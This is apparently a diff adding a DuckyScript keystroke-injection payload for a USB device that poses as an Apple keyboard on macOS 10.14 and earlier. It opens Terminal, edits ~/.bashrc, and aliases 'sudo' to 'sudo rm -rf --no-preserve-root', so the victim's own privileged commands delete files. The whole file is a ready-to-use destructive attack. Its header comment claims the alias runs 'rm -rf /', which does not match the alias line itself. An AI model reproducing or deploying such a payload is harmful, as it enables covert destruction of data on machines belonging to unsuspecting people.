@@ -1,0 +1,25 @@
+REM Changes sudo to 'sudo rm -rf / --no-preserve-root'
+REM Target OSx 10.14 and below
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+COMMAND SPACE
+DELAY 500
+STRING terminal.app
+DELAY 300
+ENTER
+DELAY 1000
+STRING nano ~/.bashrc
+DELAY 500
+CTRL w
+DELAY 150
+STRING alias ls=
+ENTER
+DELAY 150
+END
+ENTER
+SPACE
+REPEAT 3
+STRING alias sudo='sudo rm -rf --no-preserve-root'
+CTRL o
+DELAY 150
+ENTER
